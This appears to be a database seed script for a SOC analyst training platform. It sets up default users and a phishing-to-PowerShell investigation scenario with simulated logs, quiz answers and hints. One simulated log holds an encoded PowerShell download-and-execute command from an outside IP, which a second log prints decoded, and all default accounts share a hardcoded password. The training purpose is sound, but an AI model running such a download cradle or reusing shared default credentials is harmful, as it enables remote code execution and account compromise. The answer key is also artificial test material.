import { PrismaClient, Role, Difficulty, LogType, UnlockCondition, CheckpointType } from '@prisma/client';
import bcrypt from 'bcryptjs';
import { scenario2, scenario3, scenario4, scenario5 } from './seed-data/scenarios';

const prisma = new PrismaClient();

async function main() {
  console.log('Seeding database...');

  // Create default users
  const hashedPassword = await bcrypt.hash('Password123!', 12);

  const admin = await prisma.user.upsert({
    where: { email: 'admin@soc.local' },
    update: {},
    create: {
      email: 'admin@soc.local',
      password: hashedPassword,
      name: 'System Administrator',
      role: Role.ADMIN,
    },
  });

  const trainer = await prisma.user.upsert({
    where: { email: 'trainer@soc.local' },
    update: {},
    create: {
      email: 'trainer@soc.local',
      password: hashedPassword,
      name: 'Lead Trainer',
      role: Role.TRAINER,
    },
  });

  const trainee = await prisma.user.upsert({
    where: { email: 'trainee@soc.local' },
    update: {},
    create: {
      email: 'trainee@soc.local',
      password: hashedPassword,
      name: 'SOC Analyst Trainee',
      role: Role.TRAINEE,
    },
  });

  console.log('Created users:', { admin: admin.email, trainer: trainer.email, trainee: trainee.email });

  // Create Scenario 1: Phishing -> PowerShell Execution
  const scenario1 = await prisma.scenario.upsert({
    where: { id: 'scenario-phishing-ps' },
    update: {},
    create: {
      id: 'scenario-phishing-ps',
      name: 'Phishing to PowerShell Execution',
      description: 'Investigate a phishing email that led to PowerShell-based malware execution and C2 communication. This scenario covers the full kill chain from initial access to command and control.',
      difficulty: Difficulty.BEGINNER,
      category: 'Email Threats',
      mitreAttackIds: ['T1566.001', 'T1059.001', 'T1071.001'],
      briefing: `## Scenario Briefing\n\nYou are a Tier 1 SOC Analyst at Acme Corp. At 09:15 AM, the SIEM generated an alert for suspicious PowerShell activity on workstation WS-PC042.\n\nYour task is to:\n1. Investigate the email gateway logs for the initial phishing email\n2. Analyze endpoint activity to trace the execution chain\n3. Identify any command and control (C2) communication\n4. Document your findings and recommend response actions\n\n**Time Pressure:** The workstation is still active on the network. Quick investigation is critical.`,
      estimatedMinutes: 45,
    },
  });

  // Stage 1: Email Gateway Alert
  const stage1 = await prisma.scenarioStage.upsert({
    where: { scenarioId_stageNumber: { scenarioId: scenario1.id, stageNumber: 1 } },
    update: {},
    create: {
      scenarioId: scenario1.id,
      stageNumber: 1,
      title: 'Email Gateway Alert',
      description: 'Review email gateway logs to identify the phishing email and its characteristics.',
      unlockCondition: UnlockCondition.AFTER_PREVIOUS,
    },
  });

  // Stage 2: Endpoint Activity
  const stage2 = await prisma.scenarioStage.upsert({
    where: { scenarioId_stageNumber: { scenarioId: scenario1.id, stageNumber: 2 } },
    update: {},
    create: {
      scenarioId: scenario1.id,
      stageNumber: 2,
      title: 'Endpoint Activity',
      description: 'Analyze endpoint logs including Sysmon and EDR alerts to trace the execution chain from the phishing attachment.',
      unlockCondition: UnlockCondition.AFTER_CHECKPOINT,
    },
  });

  // Stage 3: C2 Communication
  const stage3 = await prisma.scenarioStage.upsert({
    where: { scenarioId_stageNumber: { scenarioId: scenario1.id, stageNumber: 3 } },
    update: {},
    create: {
      scenarioId: scenario1.id,
      stageNumber: 3,
      title: 'Command & Control Communication',
      description: 'Examine network flow and firewall logs to identify C2 communication patterns.',
      unlockCondition: UnlockCondition.AFTER_CHECKPOINT,
    },
  });

  console.log('Created scenario with 3 stages');

  // Stage 1 Logs - Email Gateway
  const stage1Logs = [
    {
      stageId: stage1.id, logType: LogType.EMAIL_GATEWAY, summary: 'Inbound email from external sender to j.smith@acme.com with attachment Invoice_Q4_2024.xlsm',
      severity: 'HIGH', hostname: 'MAIL-GW01', username: 'j.smith', timestamp: new Date('2024-01-15T09:12:00Z'), isEvidence: true, evidenceTag: 'phishing-email',
      rawLog: { messageId: 'MSG-2024-0115-001', from: 'billing@supp0rt-center.com', to: 'j.smith@acme.com', subject: 'Urgent: Invoice Q4 2024 - Action Required', attachments: ['Invoice_Q4_2024.xlsm'], spfResult: 'fail', dkimResult: 'none', sizeBytes: 245780, headers: { 'X-Originating-IP': '185.234.72.15', 'Return-Path': 'billing@supp0rt-center.com' } },
      sortOrder: 1,
    },
    {
      stageId: stage1.id, logType: LogType.EMAIL_GATEWAY, summary: 'Email attachment scan: Invoice_Q4_2024.xlsm flagged as suspicious - contains macros',
      severity: 'MEDIUM', hostname: 'MAIL-GW01', timestamp: new Date('2024-01-15T09:12:01Z'), isEvidence: true, evidenceTag: 'macro-attachment',
      rawLog: { scanEngine: 'MailScan v4.2', fileName: 'Invoice_Q4_2024.xlsm', fileHash: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', fileType: 'Microsoft Excel Macro-Enabled', macroDetected: true, verdict: 'Suspicious', reason: 'VBA macro with shell execution capability' },
      sortOrder: 2,
    },
    {
      stageId: stage1.id, logType: LogType.EMAIL_GATEWAY, summary: 'Normal inbound email to m.jones@acme.com - weekly newsletter',
      severity: 'INFO', hostname: 'MAIL-GW01', username: 'm.jones', timestamp: new Date('2024-01-15T09:10:00Z'), isEvidence: false,
      rawLog: { messageId: 'MSG-2024-0115-000', from: 'newsletter@techweekly.com', to: 'm.jones@acme.com', subject: 'Tech Weekly Digest #204', spfResult: 'pass', dkimResult: 'pass' },
      sortOrder: 3,
    },
    {
      stageId: stage1.id, logType: LogType.EMAIL_GATEWAY, summary: 'Inbound email to r.chen@acme.com from known partner - contract document',
      severity: 'INFO', hostname: 'MAIL-GW01', username: 'r.chen', timestamp: new Date('2024-01-15T09:08:00Z'), isEvidence: false,
      rawLog: { messageId: 'MSG-2024-0115-002', from: 'legal@partnerco.com', to: 'r.chen@acme.com', subject: 'RE: Contract renewal 2024', spfResult: 'pass', dkimResult: 'pass' },
      sortOrder: 4,
    },
    {
      stageId: stage1.id, logType: LogType.SIEM_ALERT, summary: 'SIEM Alert: Suspicious email sender domain - supp0rt-center.com resembles typosquat',
      severity: 'HIGH', hostname: 'SIEM-01', timestamp: new Date('2024-01-15T09:12:05Z'), isEvidence: true, evidenceTag: 'typosquat-domain',
      rawLog: { alertId: 'SIEM-2024-4521', ruleName: 'Typosquat Domain Detection', severity: 'High', source: 'Email Gateway', matchedDomain: 'supp0rt-center.com', similarTo: 'support-center.com', confidence: 0.92 },
      sortOrder: 5,
    },
    {
      stageId: stage1.id, logType: LogType.DNS, summary: 'DNS lookup for supp0rt-center.com resolved to 185.234.72.15',
      severity: 'INFO', hostname: 'DNS-01', timestamp: new Date('2024-01-15T09:11:55Z'), isEvidence: true, evidenceTag: 'malicious-domain-dns', sourceIp: '10.0.1.42', destIp: '185.234.72.15',
      rawLog: { queryType: 'A', domain: 'supp0rt-center.com', response: '185.234.72.15', ttl: 300, registrationDate: '2024-01-10' },
      sortOrder: 6,
    },
    // Noise logs
    {
      stageId: stage1.id, logType: LogType.EMAIL_GATEWAY, summary: 'Outbound email from d.wilson@acme.com to vendor',
      severity: 'INFO', hostname: 'MAIL-GW01', username: 'd.wilson', timestamp: new Date('2024-01-15T09:05:00Z'), isEvidence: false,
      rawLog: { messageId: 'MSG-2024-0115-OUT-001', from: 'd.wilson@acme.com', to: 'sales@vendor.com', subject: 'PO #4521', direction: 'outbound' },
      sortOrder: 7,
    },
    {
      stageId: stage1.id, logType: LogType.DNS, summary: 'DNS lookup for mail.acme.com - normal MX resolution',
      severity: 'INFO', hostname: 'DNS-01', timestamp: new Date('2024-01-15T09:06:00Z'), isEvidence: false,
      rawLog: { queryType: 'MX', domain: 'acme.com', response: 'mail.acme.com', ttl: 3600 },
      sortOrder: 8,
    },
    {
      stageId: stage1.id, logType: LogType.EMAIL_GATEWAY, summary: 'Spam filter blocked email from marketing@deals-now.com',
      severity: 'LOW', hostname: 'MAIL-GW01', timestamp: new Date('2024-01-15T09:09:00Z'), isEvidence: false,
      rawLog: { messageId: 'MSG-SPAM-001', from: 'marketing@deals-now.com', verdict: 'SPAM', action: 'Blocked' },
      sortOrder: 9,
    },
    {
      stageId: stage1.id, logType: LogType.AUTH_LOG, summary: 'Successful login for j.smith on WS-PC042 via Kerberos',
      severity: 'INFO', hostname: 'WS-PC042', username: 'j.smith', eventId: '4624', timestamp: new Date('2024-01-15T08:45:00Z'), isEvidence: false,
      rawLog: { eventId: 4624, logonType: 10, targetUserName: 'j.smith', workstationName: 'WS-PC042', ipAddress: '10.0.1.42', authPackage: 'Kerberos' },
      sortOrder: 10,
    },
  ];

  // Stage 2 Logs - Endpoint Activity
  const stage2Logs = [
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'Process Create: EXCEL.EXE launched by explorer.exe - user opened Invoice_Q4_2024.xlsm',
      severity: 'INFO', hostname: 'WS-PC042', username: 'j.smith', processName: 'EXCEL.EXE', eventId: '1', timestamp: new Date('2024-01-15T09:15:30Z'), isEvidence: true, evidenceTag: 'excel-launch',
      rawLog: { eventId: 1, processId: 4521, parentProcessId: 1234, image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', commandLine: '"EXCEL.EXE" "C:\\Users\\j.smith\\Downloads\\Invoice_Q4_2024.xlsm"', parentImage: 'C:\\Windows\\explorer.exe', user: 'ACME\\j.smith', hashes: 'SHA256=legitimate_excel_hash' },
      sortOrder: 1,
    },
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'Process Create: powershell.exe spawned by EXCEL.EXE - suspicious macro execution',
      severity: 'CRITICAL', hostname: 'WS-PC042', username: 'j.smith', processName: 'powershell.exe', eventId: '1', timestamp: new Date('2024-01-15T09:15:45Z'), isEvidence: true, evidenceTag: 'ps-spawn',
      rawLog: { eventId: 1, processId: 5678, parentProcessId: 4521, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', commandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADcAMgAuADEANQAvAHAAYQB5AGwAbwBhAGQAJwApAA==', parentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', user: 'ACME\\j.smith' },
      sortOrder: 2,
    },
    {
      stageId: stage2.id, logType: LogType.EDR_ALERT, summary: 'EDR Alert: Encoded PowerShell execution from Office application - High Confidence Malicious',
      severity: 'CRITICAL', hostname: 'WS-PC042', username: 'j.smith', processName: 'powershell.exe', timestamp: new Date('2024-01-15T09:15:46Z'), isEvidence: true, evidenceTag: 'edr-ps-alert',
      rawLog: { alertId: 'EDR-2024-1152', alertName: 'Suspicious PowerShell from Office', severity: 'Critical', confidence: 0.98, mitreTactic: 'Execution', mitreTechnique: 'T1059.001', processChain: ['explorer.exe', 'EXCEL.EXE', 'powershell.exe'], decodedCommand: "IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.15/payload')", indicators: ['Base64 encoded command', 'Network download', 'Office child process'] },
      sortOrder: 3,
    },
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'Network Connection: powershell.exe connecting to 185.234.72.15:80',
      severity: 'HIGH', hostname: 'WS-PC042', processName: 'powershell.exe', eventId: '3', sourceIp: '10.0.1.42', destIp: '185.234.72.15', timestamp: new Date('2024-01-15T09:15:47Z'), isEvidence: true, evidenceTag: 'ps-network',
      rawLog: { eventId: 3, processId: 5678, image: 'powershell.exe', sourceIp: '10.0.1.42', sourcePort: 49721, destIp: '185.234.72.15', destPort: 80, protocol: 'tcp' },
      sortOrder: 4,
    },
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'File Create: PowerShell dropped svchost_update.exe to Temp folder',
      severity: 'HIGH', hostname: 'WS-PC042', username: 'j.smith', processName: 'powershell.exe', eventId: '11', timestamp: new Date('2024-01-15T09:15:50Z'), isEvidence: true, evidenceTag: 'dropped-file',
      rawLog: { eventId: 11, processId: 5678, image: 'powershell.exe', targetFilename: 'C:\\Users\\j.smith\\AppData\\Local\\Temp\\svchost_update.exe', creationUtcTime: '2024-01-15T09:15:50Z', hash: 'SHA256=malicious_payload_hash_here' },
      sortOrder: 5,
    },
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'Process Create: svchost_update.exe executed from Temp directory',
      severity: 'CRITICAL', hostname: 'WS-PC042', username: 'j.smith', processName: 'svchost_update.exe', eventId: '1', timestamp: new Date('2024-01-15T09:15:55Z'), isEvidence: true, evidenceTag: 'payload-exec',
      rawLog: { eventId: 1, processId: 6789, parentProcessId: 5678, image: 'C:\\Users\\j.smith\\AppData\\Local\\Temp\\svchost_update.exe', commandLine: 'svchost_update.exe', parentImage: 'powershell.exe', user: 'ACME\\j.smith' },
      sortOrder: 6,
    },
    // Noise
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'Process Create: chrome.exe updated - normal browser activity',
      severity: 'INFO', hostname: 'WS-PC042', username: 'j.smith', processName: 'chrome.exe', eventId: '1', timestamp: new Date('2024-01-15T09:10:00Z'), isEvidence: false,
      rawLog: { eventId: 1, processId: 3333, image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', commandLine: 'chrome.exe --update', parentImage: 'services.exe' },
      sortOrder: 7,
    },
    {
      stageId: stage2.id, logType: LogType.WINDOWS_EVENT, summary: 'Windows Update service started',
      severity: 'INFO', hostname: 'WS-PC042', eventId: '7036', timestamp: new Date('2024-01-15T08:30:00Z'), isEvidence: false,
      rawLog: { eventId: 7036, source: 'Service Control Manager', message: 'The Windows Update service entered the running state.' },
      sortOrder: 8,
    },
    {
      stageId: stage2.id, logType: LogType.EDR_ALERT, summary: 'EDR Info: Scheduled antivirus scan completed on WS-PC042',
      severity: 'INFO', hostname: 'WS-PC042', timestamp: new Date('2024-01-15T08:00:00Z'), isEvidence: false,
      rawLog: { alertId: 'EDR-INFO-5521', alertName: 'Scheduled Scan Complete', severity: 'Info', threatsFound: 0 },
      sortOrder: 9,
    },
    {
      stageId: stage2.id, logType: LogType.SYSMON, summary: 'Process Create: outlook.exe started by j.smith',
      severity: 'INFO', hostname: 'WS-PC042', username: 'j.smith', processName: 'OUTLOOK.EXE', eventId: '1', timestamp: new Date('2024-01-15T08:46:00Z'), isEvidence: false,
      rawLog: { eventId: 1, processId: 2222, image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', parentImage: 'explorer.exe' },
      sortOrder: 10,
    },
  ];

  // Stage 3 Logs - C2 Communication
  const stage3Logs = [
    {
      stageId: stage3.id, logType: LogType.NETWORK_FLOW, summary: 'Outbound HTTPS connection from WS-PC042 to 185.234.72.15:443 - periodic beaconing pattern',
      severity: 'CRITICAL', hostname: 'WS-PC042', sourceIp: '10.0.1.42', destIp: '185.234.72.15', processName: 'svchost_update.exe', timestamp: new Date('2024-01-15T09:16:00Z'), isEvidence: true, evidenceTag: 'c2-beacon',
      rawLog: { flowId: 'FLOW-2024-8821', sourceIp: '10.0.1.42', sourcePort: 49800, destIp: '185.234.72.15', destPort: 443, protocol: 'TCP', bytesOut: 256, bytesIn: 1024, duration: 2, flags: 'SYN,ACK', application: 'SSL/TLS' },
      sortOrder: 1,
    },
    {
      stageId: stage3.id, logType: LogType.FIREWALL, summary: 'Firewall: Allowed HTTPS to 185.234.72.15 from 10.0.1.42 - not in blocklist',
      severity: 'HIGH', hostname: 'FW-01', sourceIp: '10.0.1.42', destIp: '185.234.72.15', timestamp: new Date('2024-01-15T09:16:00Z'), isEvidence: true, evidenceTag: 'fw-allow-c2',
      rawLog: { ruleId: 'DEFAULT-ALLOW-HTTPS', action: 'ALLOW', sourceIp: '10.0.1.42', destIp: '185.234.72.15', destPort: 443, protocol: 'TCP' },
      sortOrder: 2,
    },
    {
      stageId: stage3.id, logType: LogType.NETWORK_FLOW, summary: 'Repeated beacon: WS-PC042 to 185.234.72.15 every 60 seconds - C2 pattern detected',
      severity: 'CRITICAL', hostname: 'WS-PC042', sourceIp: '10.0.1.42', destIp: '185.234.72.15', timestamp: new Date('2024-01-15T09:17:00Z'), isEvidence: true, evidenceTag: 'c2-pattern',
      rawLog: { flowId: 'FLOW-2024-8822', sourceIp: '10.0.1.42', destIp: '185.234.72.15', destPort: 443, beaconInterval: 60, beaconJitter: 0.1, sessionsObserved: 15, totalBytesOut: 3840, totalBytesIn: 15360 },
      sortOrder: 3,
    },
    {
      stageId: stage3.id, logType: LogType.PROXY, summary: 'Proxy log: SSL connection to 185.234.72.15 with self-signed certificate',
      severity: 'HIGH', hostname: 'PROXY-01', sourceIp: '10.0.1.42', destIp: '185.234.72.15', timestamp: new Date('2024-01-15T09:16:05Z'), isEvidence: true, evidenceTag: 'self-signed-cert',
      rawLog: { proxyAction: 'ALLOW', url: 'https://185.234.72.15/', method: 'CONNECT', userAgent: 'Mozilla/5.0', certIssuer: 'CN=185.234.72.15', certSubject: 'CN=185.234.72.15', certSelfSigned: true, sniMismatch: true },
      sortOrder: 4,
    },
    {
      stageId: stage3.id, logType: LogType.SIEM_ALERT, summary: 'SIEM Alert: C2 beaconing pattern detected - IP 185.234.72.15 in threat intel feed',
      severity: 'CRITICAL', hostname: 'SIEM-01', sourceIp: '10.0.1.42', destIp: '185.234.72.15', timestamp: new Date('2024-01-15T09:20:00Z'), isEvidence: true, evidenceTag: 'siem-c2-alert',
      rawLog: { alertId: 'SIEM-2024-4525', ruleName: 'C2 Beacon Detection', severity: 'Critical', sourceIp: '10.0.1.42', destIp: '185.234.72.15', threatIntelMatch: true, feedName: 'AbuseIPDB', abuseConfidence: 95, relatedAlerts: ['SIEM-2024-4521'] },
      sortOrder: 5,
    },
    {
      stageId: stage3.id, logType: LogType.DNS, summary: 'DNS query for update.microsoft.com from WS-PC042 - legitimate',
      severity: 'INFO', hostname: 'DNS-01', sourceIp: '10.0.1.42', timestamp: new Date('2024-01-15T09:18:00Z'), isEvidence: false,
      rawLog: { queryType: 'A', domain: 'update.microsoft.com', response: '13.107.4.50', ttl: 3600 },
      sortOrder: 6,
    },
    {
      stageId: stage3.id, logType: LogType.NETWORK_FLOW, summary: 'Normal HTTPS traffic from WS-PC042 to Office 365',
      severity: 'INFO', hostname: 'WS-PC042', sourceIp: '10.0.1.42', destIp: '52.96.0.1', timestamp: new Date('2024-01-15T09:14:00Z'), isEvidence: false,
      rawLog: { flowId: 'FLOW-2024-8800', sourceIp: '10.0.1.42', destIp: '52.96.0.1', destPort: 443, application: 'Office365', bytesOut: 5120, bytesIn: 25600 },
      sortOrder: 7,
    },
    {
      stageId: stage3.id, logType: LogType.FIREWALL, summary: 'Firewall: Blocked outbound SSH attempt from WS-PC099 - unrelated',
      severity: 'MEDIUM', hostname: 'FW-01', sourceIp: '10.0.1.99', destIp: '203.0.113.50', timestamp: new Date('2024-01-15T09:19:00Z'), isEvidence: false,
      rawLog: { ruleId: 'BLOCK-OUTBOUND-SSH', action: 'BLOCK', sourceIp: '10.0.1.99', destIp: '203.0.113.50', destPort: 22, protocol: 'TCP' },
      sortOrder: 8,
    },
  ];

  // Create all logs
  for (const log of [...stage1Logs, ...stage2Logs, ...stage3Logs]) {
    await prisma.simulatedLog.create({ data: log });
  }
  console.log(`Created ${stage1Logs.length + stage2Logs.length + stage3Logs.length} simulated logs`);

  // Checkpoints for Scenario 1
  const checkpoints = [
    // Stage 1 checkpoints
    {
      scenarioId: scenario1.id, stageNumber: 1, checkpointType: CheckpointType.TRUE_FALSE, sortOrder: 1,
      question: 'The phishing email passed both SPF and DKIM authentication checks.',
      correctAnswer: false, points: 10, category: 'accuracy',
      options: ['True', 'False'],
      explanation: 'The email from supp0rt-center.com failed SPF and had no DKIM signature, which are indicators of a spoofed or malicious email.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 1, checkpointType: CheckpointType.MULTIPLE_CHOICE, sortOrder: 2,
      question: 'What technique was used in the sender email domain to deceive the recipient?',
      correctAnswer: 'Typosquatting', points: 10, category: 'accuracy',
      options: ['Typosquatting', 'Subdomain takeover', 'Email spoofing without domain modification', 'Homograph attack'],
      explanation: 'The domain supp0rt-center.com uses typosquatting by replacing "o" with "0" to mimic support-center.com.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 1, checkpointType: CheckpointType.SEVERITY_CLASSIFICATION, sortOrder: 3,
      question: 'Based on Stage 1 evidence, classify the severity of this email threat.',
      correctAnswer: 'HIGH', points: 10, category: 'accuracy',
      options: ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
      explanation: 'A targeted phishing email with macro-enabled attachment that bypassed the gateway warrants HIGH severity.',
    },
    // Stage 2 checkpoints
    {
      scenarioId: scenario1.id, stageNumber: 2, checkpointType: CheckpointType.MULTIPLE_CHOICE, sortOrder: 1,
      question: 'What was the parent process that spawned the malicious PowerShell instance?',
      correctAnswer: 'EXCEL.EXE', points: 10, category: 'accuracy',
      options: ['explorer.exe', 'EXCEL.EXE', 'cmd.exe', 'svchost.exe'],
      explanation: 'The Sysmon logs show EXCEL.EXE (PID 4521) spawned powershell.exe, indicating macro execution.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 2, checkpointType: CheckpointType.TRUE_FALSE, sortOrder: 2,
      question: 'The PowerShell command was run with a Base64-encoded payload using the -Enc flag.',
      correctAnswer: true, points: 10, category: 'accuracy',
      options: ['True', 'False'],
      explanation: 'The command line shows -Enc flag followed by a Base64-encoded string that decodes to a download cradle.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 2, checkpointType: CheckpointType.RECOMMENDED_ACTION, sortOrder: 3,
      question: 'What is the most appropriate immediate action for the affected workstation?',
      correctAnswer: 'Isolate the host', points: 15, category: 'response',
      options: ['Isolate the host', 'Block the IOC at firewall', 'Escalate to Tier 2', 'Continue monitoring', 'Reimage immediately'],
      explanation: 'Network isolation prevents further C2 communication while preserving forensic evidence.',
    },
    // Stage 3 checkpoints
    {
      scenarioId: scenario1.id, stageNumber: 3, checkpointType: CheckpointType.MULTIPLE_CHOICE, sortOrder: 1,
      question: 'What is the approximate C2 beacon interval observed in the network traffic?',
      correctAnswer: '60 seconds', points: 10, category: 'accuracy',
      options: ['10 seconds', '30 seconds', '60 seconds', '5 minutes'],
      explanation: 'Network flow analysis shows beaconing every 60 seconds with 10% jitter.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 3, checkpointType: CheckpointType.EVIDENCE_SELECTION, sortOrder: 2,
      question: 'Select all indicators of compromise (IOCs) identified in this investigation.',
      correctAnswer: ['185.234.72.15', 'supp0rt-center.com', 'svchost_update.exe', 'Invoice_Q4_2024.xlsm'], points: 15, category: 'evidence',
      options: ['185.234.72.15', 'supp0rt-center.com', 'svchost_update.exe', 'Invoice_Q4_2024.xlsm', '10.0.1.42', 'chrome.exe', 'update.microsoft.com'],
      explanation: 'The malicious IP, typosquat domain, dropped executable, and phishing attachment are the key IOCs.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 3, checkpointType: CheckpointType.INCIDENT_REPORT, sortOrder: 3,
      question: 'Write a brief incident summary and provide at least 3 recommended response actions.',
      correctAnswer: { keywords: ['phishing', 'powershell', 'c2', 'macro', 'isolate'], minRecommendations: 3 }, points: 10, category: 'report',
      explanation: 'A complete report should cover the attack chain and include actionable response steps.',
    },
    {
      scenarioId: scenario1.id, stageNumber: 3, checkpointType: CheckpointType.SEVERITY_CLASSIFICATION, sortOrder: 4,
      question: 'What is the overall incident severity classification?',
      correctAnswer: 'CRITICAL', points: 10, category: 'accuracy',
      options: ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
      explanation: 'Active C2 communication from a compromised host with data exfiltration potential is CRITICAL.',
    },
  ];

  for (const cp of checkpoints) {
    await prisma.checkpoint.create({ data: cp });
  }
  console.log(`Created ${checkpoints.length} checkpoints`);

  // Hints
  const hints = [
    { stageId: stage1.id, content: 'Look at the SPF and DKIM results for the suspicious email. Legitimate organizations typically pass both checks.', pointsPenalty: 3, sortOrder: 1 },
    { stageId: stage1.id, content: 'Compare the sender domain carefully with common support domains. Attackers often use character substitution.', pointsPenalty: 3, sortOrder: 2 },
    { stageId: stage1.id, content: 'The SIEM alert about typosquatting directly identifies the deception technique used.', pointsPenalty: 5, sortOrder: 3 },
    { stageId: stage2.id, content: 'Focus on the process chain: What launched PowerShell? The parent process ID links back to the application that opened the attachment.', pointsPenalty: 3, sortOrder: 1 },
    { stageId: stage2.id, content: 'The -Enc flag in PowerShell indicates Base64-encoded commands. The EDR alert decoded it for you.', pointsPenalty: 3, sortOrder: 2 },
    { stageId: stage2.id, content: 'Look at file creation events (Sysmon Event ID 11) to find what was dropped on disk.', pointsPenalty: 5, sortOrder: 3 },
    { stageId: stage3.id, content: 'C2 beacons typically show regular intervals between connections. Look at the time gaps between network flows.', pointsPenalty: 3, sortOrder: 1 },
    { stageId: stage3.id, content: 'Self-signed certificates on external IPs are a strong indicator of malicious infrastructure.', pointsPenalty: 3, sortOrder: 2 },
    { stageId: stage3.id, content: 'Threat intelligence feeds have already flagged this IP. Check the SIEM alert details.', pointsPenalty: 5, sortOrder: 3 },
  ];

  for (const hint of hints) {
    await prisma.hint.create({ data: hint });
  }
  console.log(`Created ${hints.length} hints`);

  // Seed scenarios 2-5
  for (const scenarioData of [scenario2, scenario3, scenario4, scenario5]) {
    const { stages: stagesData, checkpoints: cpsData, ...scenarioFields } = scenarioData;

    const scenario = await prisma.scenario.upsert({
      where: { id: scenarioFields.id },
      update: {},
      create: scenarioFields,
    });

    for (const stageData of stagesData) {
      const { logs: logsData, hints: hintsData, ...stageFields } = stageData;

      const stage = await prisma.scenarioStage.upsert({
        where: { scenarioId_stageNumber: { scenarioId: scenario.id, stageNumber: stageFields.stageNumber } },
        update: {},
        create: { scenarioId: scenario.id, ...stageFields },
      });

      if (logsData) {
        for (const logData of logsData) {
          await prisma.simulatedLog.create({
            data: {
              ...logData,
              stageId: stage.id,
              timestamp: new Date(logData.timestamp),
            },
          });
        }
      }

      if (hintsData) {
        for (const hintData of hintsData) {
          await prisma.hint.create({
            data: { ...hintData, stageId: stage.id },
          });
        }
      }
    }

    if (cpsData) {
      for (const cpData of cpsData) {
        await prisma.checkpoint.create({
          data: { ...cpData, scenarioId: scenario.id },
        });
      }
    }

    console.log(`Created scenario: ${scenarioFields.name}`);
  }

  console.log('Seed completed successfully!');
}

main()
  .catch((e) => {
    console.error('Seed failed:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
